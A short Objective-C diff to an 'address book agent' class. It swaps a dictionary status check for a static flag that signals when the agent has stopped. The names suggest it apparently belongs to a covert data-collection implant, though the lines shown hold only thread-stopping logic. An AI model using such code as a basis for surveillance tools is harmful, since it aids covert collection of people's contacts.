@@ -19,6 +19,8 @@
 
 static RCSIAgentAddressBook *sharedAgentAddressBook = nil;
 
+// Now the status is updated by agent Calendar
+static BOOL gAgentStopped = FALSE;
 
 @interface RCSIAgentAddressBook (hidden)
 
@@ -715,8 +717,10 @@ typedef struct _ABLogStrcut {
   CFRelease(addressBook);
   
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-  
+  {
+    // Agent Calendar set the status to STOPPED
+    gAgentStopped = TRUE;
+  }
   [outerPool release];
 }
 
@@ -726,7 +730,7 @@ typedef struct _ABLogStrcut {
   
   [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
+  while (gAgentStopped != TRUE &&
          internalCounter <= MAX_WAIT_TIME)
     {
       internalCounter++;
